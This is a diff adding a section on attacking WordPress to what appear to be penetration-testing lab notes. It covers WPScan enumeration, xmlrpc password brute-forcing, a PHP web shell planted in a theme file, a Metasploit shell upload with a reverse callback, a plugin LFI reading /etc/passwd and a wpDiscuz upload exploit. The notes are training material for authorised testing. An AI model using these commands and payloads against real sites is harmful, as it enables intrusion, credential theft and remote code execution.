@@ -228,3 +228,134 @@ sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token <TOKEN
 
 ---
 
+# 🛠️ Attacking WordPress
+
+## 🎯 Objective
+
+Gain initial access to a WordPress-based web server by abusing weak credentials, misconfigurations, and known vulnerabilities in plugins/themes.
+
+
+## 🔍 Step 1: Enumerate Users and Plugins
+
+Tools like **WPScan** are used to enumerate:
+
+* WordPress **version**
+* Installed **plugins** & **themes**
+* **Users**
+
+Example WPScan command for enumeration:
+
+```bash
+sudo wpscan --url http://blog.inlanefreight.local --enumerate u,ap,vt
+```
+
+## 🚪 Step 2: Brute Force Login Credentials
+
+### 📌 Method: `xmlrpc` (preferred for speed)
+
+```bash
+sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
+```
+
+✅ Success:
+
+```
+Username: john
+Password: firebird1
+```
+
+
+## 🧬 Step 3: Code Execution via Theme Editor
+
+### 🖥️ Login to WordPress Admin Panel:
+
+URL: `http://blog.inlanefreight.local/wp-login.php`
+
+### 🛠️ Modify an Inactive Theme (e.g., `Twenty Nineteen`)
+
+Navigate:
+
+```
+Appearance > Theme Editor > Select Theme > 404.php
+```
+
+### 💻 Inject a PHP web shell:
+
+```php
+<?php system($_GET[0]); ?>
+```
+
+### 🧪 Test Shell Access:
+
+```bash
+curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
+```
+
+
+## ⚙️ Step 4: Automated Shell Upload via Metasploit
+
+### 🧰 Use `wp_admin_shell_upload` module:
+
+```bash
+use exploit/unix/webapp/wp_admin_shell_upload
+set rhosts 10.129.42.195
+set vhost blog.inlanefreight.local
+set username john
+set password firebird1
+set lhost 10.10.14.15
+exploit
+```
+
+💥 Opens Meterpreter session as `www-data`.
+
+
+## 🧨 Step 5: Exploiting Vulnerable Plugins
+
+### 🧵 mail-masta (Unauthenticated LFI)
+
+Vulnerable code:
+
+```php
+include($_GET['pl']); // No sanitization!
+```
+
+Exploit:
+
+```bash
+curl "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
+```
+
+### 🪓 wpDiscuz 7.0.4 (Unauthenticated RCE)
+
+* Vulnerability: **File upload bypass** via image upload feature
+* CVE: **CVE-2020-24186**
+
+Exploit script:
+
+```bash
+python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
+```
+
+Upload Result:
+
+```bash
+http://blog.inlanefreight.local/wp-content/uploads/2021/08/<shell>.php?cmd=id
+```
+
+## 🧹 Post-Exploitation & Clean-up
+
+🧾 Add the following to your report:
+
+* **Exploited systems** (IP/hostname + vector)
+* **Compromised users** (username, creds, access level)
+* **Artifacts** (web shells, payloads, logs)
+* **Modifications** (user creation, privilege changes)
+
+📌 Clean up:
+
+* Remove uploaded shells (e.g., `.php` files in uploads or plugin dirs)
+* Remove added users or changes made during testing
+
+---
+
+
